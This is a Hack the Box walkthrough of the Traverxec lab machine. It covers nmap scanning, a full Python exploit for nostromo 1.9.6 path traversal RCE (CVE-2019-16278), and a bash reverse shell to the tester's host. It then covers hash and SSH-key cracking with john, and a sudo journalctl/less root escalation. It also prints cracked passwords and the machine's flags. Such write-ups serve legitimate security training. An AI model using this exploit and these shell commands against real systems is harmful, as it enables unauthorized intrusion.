+++
title = "HTB - Traverxec"
date = 2025-03-04
+++

---
title: "Traverxec - Hack the Box"
date: 2024-12-16 08:43:20 -0400
categories: [Hack the Box]
tags: [Walkthrough, Linux, Directory Traversal, CVE, RCE, JournalCTL, Nostromo, Easy]
image: /assets/Traverxec.png
---
<img alt="Image" async src="images/Traverxec.png" width="800px"></img>

Traverxec is a straightforward, easy machine that starts with a vulnerable version of `nostromo` that is susceptible to path traversal through the faulty `http-verify` function. This can be leveraged for remote code execution, and by extension, a low-privilege shell on the machine as `www-data`. Once there, the site configuration file leaks information about site structure, leading to the exposure of the primary user's SSH keys for a late stage and secure pivot onto the box. Finally, a script in that user's `/bin` directory makes a `sudo` call to `journalctl`, which can be abused to upgrade to root privileges if the terminal session matches a certain criterion. Let's get cracking.

### Scan
```
nmap -sV -sC -p- --open 10.10.10.165
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 08:43 EST
Nmap scan report for 10.10.10.165
Host is up (0.12s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

### Enumeration

Again, with a web server and an SSH pathway, the latter is likely a late stage pivot. Looking a bit deeper into our port 80 results, though, we see an instance of `nostromo 1.9.6` and the title of the machine `TRAVERXEC`. 

<img alt="Image" async src="images/Screenshot 2025-02-27 at 14.13.52.png" width="800px"></img>

Simple webpage. Upon doing some research, we find that this version of `nostromo` is vulnerable to path traversal, which allows an attacker to exploit the `http_verify` function for remote code execution via an HTTP request. [CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278). Our `searchsploit` results echo the same sentiment:

<img alt="Image" async src="images/Screenshot 2025-02-27 at 13.00.48.png" width="800px"></img>

<img alt="Image" async src="images/Screenshot 2025-02-27 at 13.01.09.png" width="800px"></img>

The original RCE POC script was written in 2019, and by the look of it, It abuses path traversal to reach `/bin/sh`, allowing arbitrary command execution without authentication. I'd found a [newer version](https://github.com/FredBrave/CVE-2019-16278-Nostromo-1.9.6-RCE/blob/main/README.md) that was only a few years old at the time of doing this box. The script was more fleshed out and was a bit more thorough than the exploit database one. Always dig for updated and better scripts, because as `searchsploit` provides a baseline, usually there are better versions in the wild. Additionally, you can improve on some of these yourself as well, and it's hard to do so with a DB that isn't always up to date with the latest versions of scripts.

```python
#Exploit: nostromo 1.9.6 - Remote Code Execution
#CVE: CVE-2019-16278
#Author exploit: FredBrave
import sys
import socket
import optparse


def Building_payload(command):
    URL = "/.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0"
    payload= "POST "+URL+"\r\n"
    payload += "Content-Length: 1\r\n\r\n"
    payload += "echo\necho\n"+command+" 2>&1"
    return payload

def exploit(ip, port, command):
    payload = Building_payload(command)
    conexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conexion.connect((ip, int(port)))
    conexion.sendall(payload.encode('utf-8'))
    recive = conexion.recv(options.bytes)
    print(recive)
    conexion.close()

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-i', '--ip', dest='ip', help='Ip of target')
    parser.add_option('-p', '--port', dest='port', help='Port where service is running')
    parser.add_option('-c', '--command', dest='command', help='Command to execute')
    parser.add_option('-b', '--bytes', dest='bytes', default=4096, type=int)
    (options, arguments) = parser.parse_args()
    if not options.ip:
        parser.error('[-]Pls indicate de host, Example: -i 10.10.10.10')
    if not options.port:
        parser.error('[-]Pls indicate the port, Example: -p 80')
    if not options.command:
        parser.error('[-]Pls indicate the command to execute: -c "whoami"')
    return options
if __name__ == '__main__':
    options = get_arguments()
    exploit(options.ip, options.port, options.command)
```

We can start a listener with `rlwrap nc -nvlp 443`, and run the POC with:

`python3 oof.py --ip=10.10.10.165 --port=80 --command="bash -c 'bash -i >& /dev/tcp/10.10.14.24/443 0>&1'"`

We can stabilize our shell:

`TARGET: python3 -c 'import pty; pty.spawn("/bin/bash")'`
`TARGET: BACKGROUND THE PROCESS WITH ^Z`
`HOST: stty raw -echo;fg`
`TARGET: export TERM="xterm"`

Now, we're on the box as `www-data` user.

### Privilege Escalation

We don't have access to the user `david` directory, so we cannot grab any flags yet. We can, though, transfer `linpeas` over to the box by hosting on our machine: `python3 -m http.server 8000`, and then pulling it down with `wget http://10.10.14.24:8000/linpeas.sh`. `curl` isn't on this box, and we aren't allowed to use `./linpeas.sh` to run, so we can instead use `bash linpeas.sh` to enact the script and start combing through the results.

We come across an `htpasswd` hash for `david`:

<img alt="Image" async src="images/Screenshot 2025-02-27 at 13.45.29.png" width="800px"></img>

This hash format belongs to Apache, and suggests that theres a portal somewhere. We can throw this into a file and crack with `john`: `john david.hash --wordlist=/usr/share/wordlists/rockyou.txt`

<img alt="Image" async src="images/Screenshot 2025-02-27 at 13.49.08.png" width="800px"></img>

`david:Nowonly4me`. If we tried to `su david` on our connection, we'd get an authentication failure. 

Now, because we know that we've got an Apache hash and a portal somewhere, I can look around. There's no access to `david`'s home directory, but when we visit `var/nostromo` (Web instances are usually kept in the `var`) we can find a configuration file that details how the site works

<img alt="Image" async src="images/Screenshot 2025-03-04 at 14.17.04.png" width="800px"></img>

Interestingly, there's a section that notes a home directory being referenced on the website, and browsing through the manpages of `nostromo`, we can get an idea of how the site is structured:

```
HOMEDIRS
  To serve the home directories of your users via HTTP, enable the homedirs
  option by defining the path in where the home directories are stored,
  normally /home.  To access a users home directory enter a ~ in the URL
  followed by the home directory name like in this example:

        http://www.nazgul.ch/~hacki/

  The content of the home directory is handled exactly the same way as a
  directory in your document root.  If some users don't want that their
  home directory can be accessed via HTTP, they shall remove the world
  readable flag on their home directory and a caller will receive a 403
  Forbidden response.  Also, if basic authentication is enabled, a user can
  create an .htaccess file in his home directory and a caller will need to
  authenticate.

  You can restrict the access within the home directories to a single sub
  directory by defining it via the homedirs_public option.

```

This means that `http://10.10.10.165/~david` will be `/home/david/public_www`.

Accessing through a browser on our own machine doesn't work and will not return anything, however we have to keep in mind that our shell (`www-data`) must be able to read this directory for functionality reasons. Now that we know the name of the home directory due to the `manpages` and the configuration file, we can `cd` directly to it.

Once there, we find a protected file area, and inside there is a SSH backup identity archive. We can visit this specific folder through a browser and download the file onto our machine to leverage a stable connection back onto the box as `david`. Going to `http://traverxec.htb/~david/protected-file-area/`, you're met with the portal that we'd expected, and use the credentials we found earlier. Once in, we are able to download the file. Unzip with `tar -xvf backup-ssh-identity-files.tgz`, and change permissions to suit the use (`chmod 600`).

Trying to `ssh` into the box will require a password for the key, but we can crack with `ssh2john`:

`ssh2john id_rsa > id_rsa.john`
`mv id_rsa.john /home/li0t/HTB/Traverxec`
`john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt`

We find the password to be `hunter`. SSH into the box now with the `id_rsa`:

`ssh -i id_rsa david@traverxec.htb`

USER:`ffcd7f3b3d4238d47f40b735bb8aecc2`

We've got no `sudo -l`, but we can see a script in the user's `bin` directory. We can run it, and its a simple analytical tool.

<img alt="Image" async src="images/Screenshot 2025-03-04 at 15.02.01.png" width="800px"></img>

Looking at the source code, there's a `sudo` call to `journalctl`. This is dangerous because `journalctl` uses stdout if the output fits on the screen but defaults to `less` when the output is too large. By shrinking the terminal to fewer than five lines before running` journalctl -n5 -unostromo.service`, we force it to open in `less`. Since `less` allows executing shell commands when running as root, typing `!/bin/bash` inside less spawns a root shell. This exploits the fact that `journalctl` was run with `sudo`, granting full root access without additional authentication.

Run: `/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`, while making sure the terminal is small enough to force a default to `less`, then type `!/bin/bash`.

ROOT:`8b59c4632fec909430dfba5d880292e6`


